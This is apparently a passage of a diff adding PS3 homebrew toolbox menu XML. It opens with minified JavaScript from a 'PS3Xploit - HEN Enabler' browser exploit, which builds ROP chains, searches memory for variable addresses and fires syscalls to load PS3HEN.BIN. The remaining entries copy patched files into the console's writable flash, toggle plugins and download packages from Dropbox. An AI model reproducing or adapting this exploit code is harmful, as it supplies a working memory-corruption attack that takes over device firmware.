initROP2(a){try{!0===a&&(total_loops=search_size_ext=search_base_off=frame_fails=0);0!==t_out&&(clearTimeout(t_out),t_out=0);offset_array=[];jump_1_addr=jump_2_addr=stack_frame_addr=0;search_max_threshold=73400320;search_base=2148532224;search_size=2*mbytes;search_base_off=0*mbytes;search_size_ext=0*mbytes;total_loops++;for(stack_frame=stack_frame_hookup()+stack_frame_swap(2315649024);0===stack_frame_addr;){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;0===frame_fails%10&&(search_base_off+=0,search_size_ext+=0);lc2();return}stack_frame=stack_frame.replaceAt(0,h2b(10799));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(-1==stack_frame_addr&&search_max_threshold\74search_size+search_size_ext){frame_fails++;lc2();return}search_max_threshold-=search_size+search_size_ext}for(jump_2=unescape("\u0102\u7efb")+fill16(48,33410)+hw(stack_frame_addr)+unescape("\ufb7e");0===jump_2_addr;){if(search_max_threshold\74search_size){lc2();return}jump_2=jump_2.replaceAt(0,h2b(32507));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(-1==jump_2_addr&&search_max_threshold\74search_size){lc2();return}search_max_threshold-=search_size}for(jump_1=unescape("\u4141\u7efa")+hw(jump_2_addr)+unescape("\ufa7e");0===jump_1_addr;){if(search_max_threshold\74search_size){lc2();return}jump_1=jump_1.replaceAt(0,h2b(32506));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(-1==jump_1_addr&&search_max_threshold\74search_size){lc2();return}search_max_threshold-=search_size}var b=cmem(stack_frame_addr-4,32768,stack_frame.length),c=cmem(jump_2_addr-4,4096,jump_2.length),d=cmem(jump_1_addr-4,4096,jump_1.length);c===jump_2&&d===jump_1&&b===stack_frame?(0!==t_out&&clearTimeout(t_out),setTimeout(trigger,1E3,jump_1_addr)):lc2()}catch(e){show("HEN installation failed because the following exception was thrown during execution: "+e+" at: "+e.lineNumber)}}function initROP(a){try{!0===a&&(search_size_ext=search_base_off=frame_fails=0);0!==t_out&&(clearTimeout(t_out),t_out=0);offset_array=[];jump_1_addr=jump_2_addr=stack_frame_addr=xtra_data_addr=0;search_max_threshold=73400320;search_base=2148532224;search_size=2*mbytes;search_base_off=0*mbytes;search_size_ext=0*mbytes;total_loops++;for(xtra_data=start_x.convert()+"/dev_flash/hen/PS3HEN.BIN".convert()+index_key.convert(!0)+unescape("\ufd7e");0===xtra_data_addr;){if(search_max_threshold\74search_size){lc1();return}xtra_data=xtra_data.replaceAt(0,h2b(32509));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}var b=xtra_data_addr+start_x.convertedSize()-4;index_key_addr=b+"/dev_flash/hen/PS3HEN.BIN".convertedSize();for(stack_frame=stack_frame_hookup()+scall(801,b,0,2382364672,0,0,0,0,0)+scall_r3r5_p2p(802,2382364672,2315255808,3145728,2382364680,0,0,0,0,0,0)+stack_frame_swap(2315255808);0===stack_frame_addr;){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;0===frame_fails%10&&(search_base_off+=0,search_size_ext+=0);lc1();return}stack_frame=stack_frame.replaceAt(0,h2b(10799));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(-1==stack_frame_addr&&search_max_threshold\74search_size+search_size_ext){frame_fails++;lc1();return}search_max_threshold-=search_size+search_size_ext}for(jump_2=unescape("\u0102\u7efb")+fill16(48,33410)+hw(stack_frame_addr)+unescape("\ufb7e");0===jump_2_addr;){if(search_max_threshold\74search_size){lc1();return}jump_2=jump_2.replaceAt(0,h2b(32507));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(-1==jump_2_addr&&search_max_threshold\74search_size){lc1();return}search_max_threshold-=search_size}for(jump_1=unescape("\u4141\u7efa")+hw(jump_2_addr)+unescape("\ufa7e");0===jump_1_addr;){if(search_max_threshold\74search_size){lc1();return}jump_1=jump_1.replaceAt(0,h2b(32506));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(-1==jump_1_addr&&search_max_threshold\74search_size){lc1();return}search_max_threshold-=search_size}var c=cmem(stack_frame_addr-4,32768,stack_frame.length),d=cmem(xtra_data_addr-4,4096,xtra_data.length),e=cmem(jump_2_addr-4,4096,jump_2.length),f=cmem(jump_1_addr-4,4096,jump_1.length);e===jump_2&&f===jump_1&&d===xtra_data&&c===stack_frame?(0!==t_out&&clearTimeout(t_out),triggerX()):lc1()}catch(g){show("HEN installation failed because the following exception was thrown during execution: "+g+" at: "+g.lineNumber)}}function stack_frame_swap(a){return hdw(gmod2_addr)+fill16(96,dbyte41)+hdw(gtemp_addr)+hdw(a)+fill8(8,dbyte41)+hdw(gmod9_addr)}function triggerX(){setTimeout(trigger,1E3,jump_1_addr);setTimeout(rop_exit_hen,4500,"HEN Failed!");total_loops=t_out=0}document.write(\47\74html\76\74head\76\74title\76PS3Xploit - HEN Enabler\74/title\76\74style\76html{left:100%;overflow:hidden;position:relative}input{opacity:0;position:relative;left:-100%}#a{display:table;height:100%;left:-100%;position:relative;width:100%;text-align:center}#b{display:table-cell;vertical-align:middle;width:100%}#result{font-size:20px;font-weight:bold;color:#fff;padding-top:16px}#dot{-webkit-border-radius:180px;background-color:rgba(255,255,255,0.4);width:160px;height:160px;position:relative;display:inline-block}#dot::before,#dot::after{-webkit-border-radius:180px;content:"";width:188px;height:188px;position:absolute;left:-20px;top:-20px;z-index:-1;border:6px solid rgba(255,255,255,0.4);background-color:transparent}#dot::after{width:176px;height:176px;left:-11px;top:-11px;border:3px solid rgba(255,255,255,0.4)}#c{margin-top:62px;left:16px;position:relative}#c div{-webkit-border-radius:8px;position:absolute;background:#fff}#c div:nth-child(1), #c div:nth-child(3), #c div:nth-child(6), #c div:nth-child(8){width:10px;height:40px}#c div:nth-child(2){height:10px;width:24px;left:12px;top:15px}#c div:nth-child(3){left:32px}#c div:nth-child(4){-webkit-border-radius:40px;width:26px;height:26px;left:48px;border:8px solid #fff;background-color:transparent;border-right-color:transparent}#c div:nth-child(5), #c div:nth-child(7){left:100px;top:8px;background-color:transparent;font-size:26px;font-weight:bolder;text-shadow:0px 4px #fff;color:#fff;letter-spacing:-24px}#c div:nth-child(5){left:60px;top:4px;font-size:20px;text-shadow:3px 0px #fff}#c div:nth-child(6){left:88px}#c div:nth-child(8){left:120px}\74/style\76\74/head\76\74body\76\74div id="exploit"\76\74/div\76\74div id="trigger"\76\74/div\76 \74input type="radio" autofocus /\76\74div id="a"\76\74div id="b"\76\74div id="dot"\76\74div id="c"\76\74div\76\74/div\76\74div\76\74/div\76\74div\76\74/div\76\74div\76\74/div\76\74div\76\u2571\74/div\76\74div\76\74/div\76\74div\76\u2572\u2572\74/div\76\74div\76\74/div\76\74/div\76\74/div\76\74div id="result"\76\74/div\76\74/div\76\74/div\76\74/body\76\74/html\76\47);setTimeout(function(){initROP(!0)},0);')</></Pair>
+			</Table>
+			<Table key="hen_487_enabler_installer">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Promote HEN Enabler</></Pair>
+				<Pair key="info"><>Install a 4.87 HEN Enabler to the root of the game category</></Pair>
+			</Table>
+			<Table key="hen_487_reinstall">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/package_setup.png</></Pair>
+				<Pair key="title"><>Reinstall HEN</></Pair>
+				<Pair key="info"><>Download and install HEN for 4.87 HFW
+				Note: HEN must be enabled above first</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="hen_487_enabler" attr="hen_487_enabler"/>
+			<Query class="type:x-xmb/folder-pixmap" key="hen_487_enabler_installer" attr="hen_487_enabler_installer" src="#hen_487_enabler_installer_item"/>
+	<!--	<Query class="type:x-xmb/folder-pixmap" key="hen_487_reinstall" attr="hen_487_reinstall" src="#hen_487_reinstall_item"/> -->
+		</Items>
+	</View>
+	
+	<View id="hen_487_enabler_installer_item">
+		<Attributes>
+			<Table key="hen_487_enabler_promoter_action">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Current HEN Enabler will be overwritten, are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back.
+				
+				This will copy a hen_enabler.xml for 4.87 to dev_flash</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/hen_enablers/487#/dev_blind/vsh/resource/explore</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/module-action" key="hen_487_enabler_promoter_action" attr="hen_487_enabler_promoter_action" />
+		</Items>
+	</View>
+	
+	<View id="hen_487_reinstall_item">
+		<Attributes>
+			<Table key="hen_487_reinstall_action">
+				<Pair key="info"><>net_package_install</></Pair>
+				<Pair key="pkg_src"><>https://dl.dropboxusercontent.com/</></Pair>
+				<Pair key="pkg_src_qa"><>https://dl.dropboxusercontent.com/</></Pair>
+				<Pair key="content_name"><>msg_install</></Pair>
+				<Pair key="content_id"><>CUSTOM-ULTOOLBOX_00-DEVIL30300000000</></Pair>
+				<Pair key="prod_pict_path"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/download_hen.png</></Pair>
+ 			</Table> 
+		</Attributes> 
+		<Items>
+			<Item class="type:x-xmb/xmlnpsignup" key="hen_487_reinstall_action" attr="hen_487_reinstall_action"/>
+		</Items> 
+	</View>
+
+	<View id="toggle_package_manager_items">
+		<Attributes>
+			<Table key="package_manager_enable">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Enable Standard Package Manager</></Pair>
+				<Pair key="info"><>Allows package manager to show in the game category</></Pair>
+			</Table>
+			<Table key="package_manager_disable">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Disable Standard Package Manager</></Pair>
+				<Pair key="info"><>Removes package manager from the game category</></Pair>
+			</Table>
+			<Table key="package_manager_upgrade">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Install Package Manager Pro to Flash</></Pair>
+				<Pair key="info"><>Replace standard Package manager on flash with the pro version</></Pair>
+			</Table>
+			<Table key="package_manager_upgrade2">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Install Optimized Package Manager Pro to Flash</></Pair>
+				<Pair key="info"><>Replace standard Package manager on flash with an optimized version</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="package_manager_enable" attr="package_manager_enable" src="#enable_package_manager"/>
+			<Query class="type:x-xmb/folder-pixmap" key="package_manager_disable" attr="package_manager_disable" src="#disable_package_manager"/>
+			<Query class="type:x-xmb/folder-pixmap" key="package_manager_upgrade" attr="package_manager_upgrade" src="#upgrade_package_manager"/>
+			<Query class="type:x-xmb/folder-pixmap" key="package_manager_upgrade2" attr="package_manager_upgrade2" src="#upgrade_package_manager2"/>
+		</Items>
+	</View>
+
+	<View id="enable_package_manager">
+		<Attributes>
+			<Table key="enable_package_manager_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Enable Standard Package Manager?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				This renames package_manager_disabled.xml to package_manager.xml on flash</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/package_manager/package_manager.xml#/dev_blind/vsh/resource/explore/xmb/package_manager.xml</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="enable_package_manager_item" attr="enable_package_manager_item"/>
+		</Items>
+	</View>
+
+	<View id="disable_package_manager">
+		<Attributes>
+			<Table key="disable_package_manager_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Disable Standard Package Manager?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				This renames package_manager.xml to package_manager_disabled.xml on flash
+				
+				Note: If you disable package manager and then remove the toolbox you
+				will have no way to install packages without reinstalling your CFW</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fdelete#/dev_blind/vsh/resource/explore/xmb/package_manager.xml</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="disable_package_manager_item" attr="disable_package_manager_item"/>
+		</Items>
+	</View>
+
+	<View id="upgrade_package_manager">
+		<Attributes>
+			<Table key="upgrade_package_manager_action">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Upgrade to Package Manager Pro?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				This installs an upgraded package_manager.xml and some icons to flash
+				USB Paths Supported: dev_usb000 to dev_usb006 (card readers supported)</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/package_manager/upgrade#/dev_blind/vsh/resource/explore</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="upgrade_package_manager_action" attr="upgrade_package_manager_action"/>
+		</Items>
+	</View>
+
+	<View id="upgrade_package_manager2">
+		<Attributes>
+			<Table key="upgrade_package_manager_action2">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Upgrade to Package Manager Pro?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				This installs an upgraded package_manager.xml and some icons to flash
+				USB Paths supported: dev_usb000 and dev_usb001 (no card reader support)</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/package_manager/upgrade2#/dev_blind/vsh/resource/explore</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="upgrade_package_manager_action2" attr="upgrade_package_manager_action2"/>
+		</Items>
+	</View>
+
+	<View id="toggle_app_home_items">
+		<Attributes>
+			<Table key="app_home_enable">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Enable App Home</></Pair>
+				<Pair key="info"><>Allows app home to show in the game category</></Pair>
+			</Table>
+			<Table key="app_home_disable">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Disable App Home</></Pair>
+				<Pair key="info"><>Removes app home from the game category</></Pair>
+			</Table>
+			<Table key="app_home_move">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Move App Home</></Pair>
+				<Pair key="info"><>Change app_homes position the game category</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="app_home_enable" attr="app_home_enable" src="#enable_app_home"/>
+			<Query class="type:x-xmb/folder-pixmap" key="app_home_disable" attr="app_home_disable" src="#disable_app_home"/>
+			<Query class="type:x-xmb/folder-pixmap" key="app_home_move" attr="app_home_move" src="#app_home_move_items"/>
+		</Items>
+	</View>
+	
+	<View id="app_home_move_items">
+		<Attributes>
+			<Table key="app_home_moved">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Alternate App Home Position</></Pair>
+				<Pair key="info"><>Change app_home position so its directly above the webMAN Games folder</></Pair>
+			</Table>
+			<Table key="app_home_normal">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Default App Home Position</></Pair>
+				<Pair key="info"><>Move app_home back to the default position</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="app_home_moved" attr="app_home_moved" src="#app_home_moved_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="app_home_normal" attr="app_home_normal" src="#app_home_normal_item"/>
+		</Items>
+	</View>
+
+	<View id="app_home_moved_item">
+		<Attributes>
+			<Table key="app_home_moved_action">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Alternate App Home Position?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				This installs a modified category_game.xml to flash</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/app_home_position/moved#/dev_blind/vsh/resource/explore/xmb</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="app_home_moved_action" attr="app_home_moved_action"/>
+		</Items>
+	</View>
+
+	<View id="app_home_normal_item">
+		<Attributes>
+			<Table key="app_home_moved_action">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Default App Home Position?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				This installs a modified category_game.xml to flash</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/app_home_position/normal#/dev_blind/vsh/resource/explore/xmb</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="app_home_moved_action" attr="app_home_moved_action"/>
+		</Items>
+	</View>
+
+	<View id="enable_app_home">
+		<Attributes>
+			<Table key="enable_app_home_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Enable App Home?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				This renames app_home_disabled.xml to app_home.xml on flash</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_blind/vsh/resource/explore/xmb/app_home_disabled.xml#/dev_blind/vsh/resource/explore/xmb/app_home.xml#move</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="enable_app_home_item" attr="enable_app_home_item"/>
+		</Items>
+	</View>
+
+	<View id="disable_app_home">
+		<Attributes>
+			<Table key="disable_app_home_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Disable App Home?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				This renames app_home.xml to app_home_disabled.xml on flash
+				
+				Note: webMAN MOD uses app home for various functions so it's recommended to leave it enabled if you use wMM</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_blind/vsh/resource/explore/xmb/app_home.xml#/dev_blind/vsh/resource/explore/xmb/app_home_disabled.xml#move</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="disable_app_home_item" attr="disable_app_home_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_long_coldboot_audio_items">
+		<Attributes>
+			<Table key="long_coldboot_enable">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Enable Extended Coldboot Audio</></Pair>
+				<Pair key="info"><>Allows start up sounds up to 20 seconds to play fully</></Pair>
+			</Table>
+			<Table key="long_coldboot_disable">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Disable Extended Coldboot Audio</></Pair>
+				<Pair key="info"><>Revert to normal length start up sound</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="long_coldboot_enable" attr="long_coldboot_enable" src="#enable_long_coldboot"/>
+			<Query class="type:x-xmb/folder-pixmap" key="long_coldboot_disable" attr="long_coldboot_disable" src="#disable_long_coldboot"/>
+		</Items>
+	</View>
+
+	<View id="enable_long_coldboot">
+		<Attributes>
+			<Table key="enable_long_coldboot_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Enable Extended Start Up Sound?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				This copies a modified custom_render_plugin.rco to flash
+				
+				Enables longer start up sounds like PS1, PS5 and Series X to play fully</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/coldboot_sound_patch/custom_render_plugin_patched.rco#/dev_blind/vsh/resource/custom_render_plugin.rco</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="enable_long_coldboot_item" attr="enable_long_coldboot_item"/>
+		</Items>
+	</View>
+
+	<View id="disable_long_coldboot">
+		<Attributes>
+			<Table key="disable_long_coldboot_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Disable Extended Start Up Sound?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				This copies the standard custom_render_plugin.rco to flash</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/coldboot_sound_patch/custom_render_plugin_ofw.rco#/dev_blind/vsh/resource/custom_render_plugin.rco</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="disable_long_coldboot_item" attr="disable_long_coldboot_item"/>
+		</Items>
+	</View>
+
+	<View id="ps2_main_items">
+		<Attributes>
+			<Table key="toggle_ps2_net_emu">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_game.png</></Pair>
+				<Pair key="title"><>PS2 Netemu Selector</></Pair>
+				<Pair key="info"><>Choose from several ps2_netemu files</></Pair>
+				<Pair key="child"><>segment</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_ps2_net_emu"	attr="toggle_ps2_net_emu" src="#ps2emu_module_options"/>
+		</Items>
+	</View>
+
+	<View id="ps2emu_module_options">
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="ps2emu" src="xmb://localhost/dev_hdd0/game/ULTOOLBOX/USRDIR/modules/PS2_Emu_Module/PS2_Emulators.xml#install_ps2emus_items"/>
+		</Items>
+	</View>
+
+	<View id="download_ps2emu_module_item">	
+		<Attributes>
+			<Table key="download_ps2emu">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/refresh.png</></Pair>
+				<Pair key="title"><>Download PS2 Emulator Resources</></Pair>
+				<Pair key="info"><>Download/Update the ps2emu resources (21MB download Required)</></Pair>
+ 			</Table>
+		</Attributes>
+		<Items>
+			<Query
+				class="type:x-xmb/folder-pixmap"
+				key="download_ps2emu"
+				attr="download_ps2emu"
+				src="#download_ps2emu_action"/>
+		</Items>
+	</View>
+
+	<View id="download_ps2emu_action">
+		<Attributes>
+			<Table key="ps2emu_link">
+				<Pair key="info"><>net_package_install</></Pair>
+				<Pair key="pkg_src"><>https://dl.dropboxusercontent.com/s/tzd9rxen611jsnx/PS2_Emulator_Module.pkg</></Pair>
+				<Pair key="pkg_src_qa"><>https://dl.dropboxusercontent.com/s/tzd9rxen611jsnx/PS2_Emulator_Module.pkg</></Pair>
+				<Pair key="content_name"><>msg_install</></Pair>
+				<Pair key="content_id"><>CUSTOM-ULTOOLBOX_00-DEVIL30300000000</></Pair>
+				<Pair key="prod_pict_path"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/download_ps2_module.png</></Pair>
+ 			</Table> 
+		</Attributes> 
+			<Items>
+			<Item class="type:x-xmb/xmlnpsignup" key="ps2emu_link" attr="ps2emu_link"/>
+		</Items> 
+	</View>
+
+	<View id="toggle_dev_blind_items">
+		<Attributes>
+			<Table key="enable_dev_blind">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Enable dev_blind</></Pair>
+				<Pair key="info"><>Mounts dev_flash partition as writeable dev_blind</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>enable_devblind</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+			<Table key="disable_dev_blind">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash.png</></Pair>
+				<Pair key="title"><>Disable dev_blind</></Pair>
+				<Pair key="info"><>Unmounts dev_blind partition</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>disable_devblind</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="enable_dev_blind" attr="enable_dev_blind"/>
+			<Item class="type:x-xmb/module-action" key="disable_dev_blind" attr="disable_dev_blind"/>
+		</Items>
+	</View>
+
+	<View id="toggle_bootplugins_items">
+		<Attributes>
+			<Table key="enable_bootplugins">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/text.png</></Pair>
+				<Pair key="title"><>Enable All Plugins</></Pair>
+				<Pair key="info"><>Allow all Cobra plugins to load</></Pair>
+			</Table>
+			<Table key="disable_bootplugins">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/file.png</></Pair>
+				<Pair key="title"><>Disable All Plugins</></Pair>
+				<Pair key="info"><>Block all Cobra plugins from loading</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="enable_bootplugins" attr="enable_bootplugins" src="#enable_bootplugins_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="disable_bootplugins" attr="disable_bootplugins" src="#disable_bootplugins_item"/>
+		</Items>
+	</View>
+
+	<View id="enable_bootplugins_item">
+		<Attributes>
+			<Table key="enable_bootplugins1">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/text.png</></Pair>
+				<Pair key="title"><>Enable All Plugins?</></Pair>
+				<Pair key="info"><>Press  to continue (Reboot Required), Press  to go back
+				
+				This will rename boot_plugins.txt.bak to boot_plugins.txt to allow it to load</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/boot_plugins.txt.bak#/dev_hdd0/boot_plugins.txt#/dev_hdd0/boot_plugins_nocobra.txt.bak#/dev_hdd0/boot_plugins_nocobra.txt#/dev_hdd0/boot_plugins_nocobra_dex.txt.bak#/dev_hdd0/boot_plugins_nocobra_dex.txt#move</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="enable_bootplugins1" attr="enable_bootplugins1"/>
+		</Items>
+	</View>
+
+	<View id="disable_bootplugins_item">
+		<Attributes>
+			<Table key="disable_bootplugins1">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/file.png</></Pair>
+				<Pair key="title"><>Disable All Plugins?</></Pair>
+				<Pair key="info"><>Press  to continue (Reboot Required), Press  to go back
+				
+				This will rename boot_plugins.txt to boot_plugins.txt.bak to stop it from loading</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
